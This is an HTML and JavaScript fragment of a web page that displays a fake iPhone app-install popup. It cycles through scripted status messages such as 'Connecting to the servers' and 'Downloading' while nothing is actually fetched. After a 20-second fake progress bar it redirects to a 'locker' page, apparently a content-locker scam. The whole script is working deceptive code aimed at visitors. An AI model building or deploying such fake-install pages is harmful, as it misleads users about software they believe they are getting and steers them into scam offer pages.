    <div class="popup modal-in" id="install" style="background: #fff; display: none;">
        <div class="fake-homescreen" style="">
            <a id="close" class="close-button"></a>
            <div class="iphone-display" aria-hidden="true">
                <div class="app-icon-area">
                    <div class="app-icon-region">
                        <img id="app_icon" alt="app icon" src="#" class="app-modal-icon" style="width: 33px; height: 33px;">
                    </div>
                    <div class="fake-homescreen-app-name" style="font-size:7.5px!important">

                <div>

    <div role="dialog">
    
        <div class="md" id="myPopup1" style="display: none">
            <div class="dialog-backdrop backdrop-in"></div>
            <div class="dialog dialog-no-buttons dialog-progress modal-in" id="myPopup" style="display: none; margin-top: -100px;">
    
                <div class="dialog-inner">
                    <div class="dialog-title">Installation...</div><div id="dt" class="dialog-text">Sit tight</div>

            </div>
        </div>

    <script>
    
        function id(id){
            return document.getElementById(id);
        }
    
        function install(icon, name, locker_id)
        {
            id("app_icon").src = icon;
            id("app_name").innerHTML = name;
            id("app-caption-title").innerHTML = name;
    
            window.lcr = "OGHELPERLOCKEDPAGE.html" + locker_id;
            id("install").style.display = "block";
        }
    
        id('close').onclick = function(){
            id("install").style.display = "none";
        }
    
        // When the user clicks on div, open the popup
        function start() {
            var x = document.getElementById("myPopup1");
            if (x.style.display === "none") {
                x.style.display = "block";
            } else {
                x.style.display = "none";
            }
            var x = document.getElementById("myPopup");
            if (x.style.display === "none") {
                x.style.display = "block";
            } else {
                x.style.display = "none";
            }
    
            var i = 0;
            $("#bar1").animate(
                    {width: "100%"},
                    {
                        duration: 20000,
                        complete : function(){
                            location.href = window.lcr;
                        }
                    });
    
    
            $(document).ready(function() {
    
                function changeText(){
                    $("#dt").text('Connecting to the servers')
                }
    
                setTimeout(changeText, 1000);
    
            });
            $(document).ready(function() {
    
                function changeText(){
                    $("#dt").text('Getting package url')
                }
    
                setTimeout(changeText, 8000);
    
            });
            $(document).ready(function() {
    
                function changeText(){
                    $("#dt").text('Downloading')
                }
    
                setTimeout(changeText, 12000);
    
            });
    
            $(document).ready(function() {
    
                function changeText(){
                    $("#dt").text('Setting up final stage')
                }
    
                setTimeout(changeText, 17000);
    
            });
    
    
        }
    </script>
